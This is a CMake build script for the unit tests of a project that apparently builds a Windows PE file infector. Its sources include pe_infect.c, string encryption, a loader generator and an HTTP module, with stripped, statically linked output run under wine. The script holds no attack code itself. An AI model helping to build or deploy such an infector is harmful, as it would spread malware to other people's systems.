set(tests_cflags "-Wall -Wextra -Werror -Wno-cast-function-type -Wno-switch -Wno-address-of-packed-member -std=gnu99 -ffast-math -fno-trapping-math -fno-signaling-nans -fvisibility=hidden -fomit-frame-pointer -fexpensive-optimizations -Os -static -fdata-sections -ffunction-sections")
set(tests_ldflags "-s -Wl,--exclude-all-symbols -Wl,--exclude-libs,msvcrt.a -Wl,--gc-sections -Wl,--strip-all -Qn -v -fPIE")

set(TESTS_SRC run_tests.c test_compat.c test_mem.c test_pe.c test_utils.c test_asm.c test_aes.c test_crypt.c test_http.c)
set(TESTS_MILLER_SRC crypt_strings.c snprintf.c compat.c math.c utils.c aes.c crypt.c file.c pe_infect.c patch.c disasm.c http.c)
PrefixPath(TESTS_SRC source/tests ${TESTS_SRC})
PrefixPath(TESTS_MILLER_SRC ${MILLER_SRCDIR} ${TESTS_MILLER_SRC})

if (BUILD_TESTS)
  add_executable(tests ${TESTS_MILLER_SRC} ${TESTS_SRC})
  add_dependencies(tests cryptout_xor cryptout_aes loader_gen)
  set_target_properties(tests PROPERTIES COMPILE_FLAGS "${tests_cflags}")
  set_target_properties(tests PROPERTIES LINK_FLAGS "${tests_ldflags} -Wl,-Map,${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PROJECT_NAME}-tests.map")
  target_link_libraries(tests distorm_pre)
  target_include_directories(tests PRIVATE ${MILLER_HDRDIR_CREATED})
  target_compile_definitions(tests PRIVATE _GNU_SOURCE=1 _RUN_TESTS=1 ${DISTORM_PRE_DEFS} ${LOADERBASE_DEFS})
  install(TARGETS tests RUNTIME DESTINATION ${INSTALL_DEST})
  add_custom_target(check DEPENDS tests)
  add_custom_command(TARGET check POST_BUILD
    COMMAND wine ${CMAKE_BINARY_DIR}/bin/tests.exe
  )
else()
  add_custom_target(check)
  add_custom_command(TARGET check POST_BUILD
      COMMAND ${CMAKE_COMMAND} -E cmake_echo_color --red --bold "${CMAKE_COMMAND}: make check requires a build with -DBUILD_TESTS enabled"
      COMMAND false
  )
endif()
